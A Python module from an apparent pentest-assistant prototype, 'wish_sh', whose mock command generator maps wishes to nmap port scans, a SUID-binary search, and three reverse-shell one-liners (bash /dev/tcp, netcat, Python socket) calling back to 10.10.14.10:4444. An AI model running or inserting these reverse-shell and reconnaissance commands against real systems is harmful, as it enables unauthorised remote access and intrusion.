"""Command generation for wish_sh."""

from abc import ABC, abstractmethod
from typing import List


class CommandGenerator(ABC):
    """Abstract base class for command generation."""

    @abstractmethod
    def generate_commands(self, wish_text: str) -> List[str]:
        """Generate commands from wish text.

        Args:
            wish_text: The wish text

        Returns:
            List of generated commands
        """
        pass


class MockCommandGenerator(CommandGenerator):
    """Mock implementation of command generator."""

    def generate_commands(self, wish_text: str) -> List[str]:
        """Generate commands based on keywords.

        Args:
            wish_text: The wish text

        Returns:
            List of generated commands
        """
        commands = []
        wish_lower = wish_text.lower()

        if "scan" in wish_lower and "port" in wish_lower:
            commands = [
                "sudo nmap -p- -oA tcp 10.10.10.40",
                "sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA udp-fast 10.10.10.40",
            ]
        elif "find" in wish_lower and "suid" in wish_lower:
            commands = ["find / -perm -u=s -type f 2>/dev/null"]
        elif "reverse shell" in wish_lower or "revshell" in wish_lower:
            commands = [
                "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'",
                "nc -e /bin/bash 10.10.14.10 4444",
                "python3 -c 'import socket,subprocess,os;"
                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                's.connect(("10.10.14.10",4444));'
                "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                'subprocess.call(["/bin/sh","-i"]);\'',
            ]
        else:
            # Default responses
            commands = [f"echo 'Executing wish: {wish_text}'", f"echo 'Processing {wish_text}' && ls -la", "sleep 5"]

        return commands


class LlmCommandGenerator(CommandGenerator):
    """Command generator using LLM."""

    def __init__(self, api_key: str, model: str = "gpt-4"):
        """Initialize.

        Args:
            api_key: LLM API key
            model: Model name to use
        """
        self.api_key = api_key
        self.model = model
        # Initialize LLM API client, etc.

    def generate_commands(self, wish_text: str) -> List[str]:
        """Generate commands using LLM.

        Args:
            wish_text: The wish text

        Returns:
            List of generated commands
        """
        # Note: In the actual implementation, LLM API would be called to generate commands
        # In this prototype implementation, we return the same result as the mock implementation
        mock_generator = MockCommandGenerator()
        return mock_generator.generate_commands(wish_text)
